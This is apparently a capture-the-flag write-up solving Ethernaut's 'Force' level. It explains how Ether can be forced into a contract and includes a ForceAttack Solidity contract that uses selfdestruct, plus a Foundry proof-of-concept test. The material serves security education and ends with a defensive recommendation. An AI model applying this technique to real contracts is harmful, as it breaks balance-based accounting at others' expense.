# Level 7 - Force

## Objectives

- make the balance of the contract greater than zero

## Contract Overview

The `Force` contract does not have any code inside. The concept behind this contract is how we can forcefully send Ether to a contract. That is why the purpose of this level is to show that even without the logic to handle payments, it is possible to send Ether to the contract and increase its balance.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Force_slither.png)

## Finding the weak spots

There are currently three ways in which we can forcefully send Ether to a contract even when it does not have any implementations to receive funds. They are:

- Self-destruct: Smart contracts can receive Ether from other contracts as a result of a `selfdestruct()` call. All the Ether stored in the calling contract will then be transferred to the address specified when calling the selfdestruct() and there's no way for the receiver to prevent this because this happens on the EVM level.
- Coinbase Transactions: An address can receive Ether as a result of Coinbase transactions or block rewards. The attacker can start proof-of-work mining and set the target address to receive the rewards.
- Pre-calculated addresses: It is possible to pre-calculate the contract addresses before they are generated. If an attacker deposits funds into the address before its deployment, it is possible to forcefully store Ether there.

The easiest way is by making use of a `selfdestruct()` function. It is a function which is used to delete a contract from the blockchain and remove it's code and storage. It looks like:

```solidity
address payable addr = payable(address(etherGame));
selfdestruct(addr);
```

Whenever this is called, the Ether stored in the contract from which it is being called will be sent to the `addr` mentioned in the arguments.

Therefore, to finish this level, we just need to deploy a malicious contract, fund it with some Ether, and use a `selfdestruct()` with the address of the Ethernaut's instance to forcefully send the balance to that contract.

## Potential attack scenario (hypothesis)

Attacker can create a malicious contract that will contain an `attack` function that trigger `selfdestruct` and specify the address of the `Force` contract as the target. Funds it with some Ether, calls the `attack` function and this way he will increase the balance of the `Force` contract.

## Plan of the attack

1. Attacker creates the malicious contract that will contain `attack` function that trigger `selfdestruct` and specify the address of the `Force` contract as the target.
2. Attacker funds the malicious contract with any amount of Ether.
3. Attacker calls the `attack` function from the malicious contract.
4. The balance of the `Force` contract is increased.

## Malicious contract (ForceAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract ForceAttack {
    Force forceContract;

    constructor(address _forceContractAddress) public {
        forceContract = Force(_forceContractAddress);
    }

    function attack() public {
        selfdestruct(payable(address(forceContract)));
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/07-Force.t.sol))

```solidity
      // Attacker creates the malicious contract that will contain `attack` function that trigger `selfdestruct` and specify the address of the `Force` contract as the target.
        ForceAttack forceAttack = new ForceAttack(levelAddress);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        // Attacker funds the malicious contract with any amount of Ether.
        emit log_string("Funding the ForceAttack contract with 1 eth");
        vm.deal(address(forceAttack), 1 ether);

        emit log_named_uint(
            "ForceAttack contract balance (before attack): ",
            address(forceAttack).balance
        );
        emit log_named_uint(
            "Exploited contract balance (before attack): ",
            address(forceContract).balance
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // Attacker calls the `attack` function from the malicious contract.
        emit log_string("Starting the exploit...");
        forceAttack.attack();

        emit log_named_uint(
            "ForceAttack contract balance (after attack): ",
            address(forceAttack).balance
        );

        // The balance of the `Force` contract is increased.
        emit log_named_uint(
            "Exploited contract balance (after attack): ",
            address(forceContract).balance
        );

        // Test assertion
        assertGe(address(forceContract).balance, 0);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Force.png)

## Recommendations

- Intrinsic accounting should not rely on the contract balance because ether can be forcefully sent to the contract

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Solidity by Example](https://solidity-by-example.org/hacks/self-destruct/)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
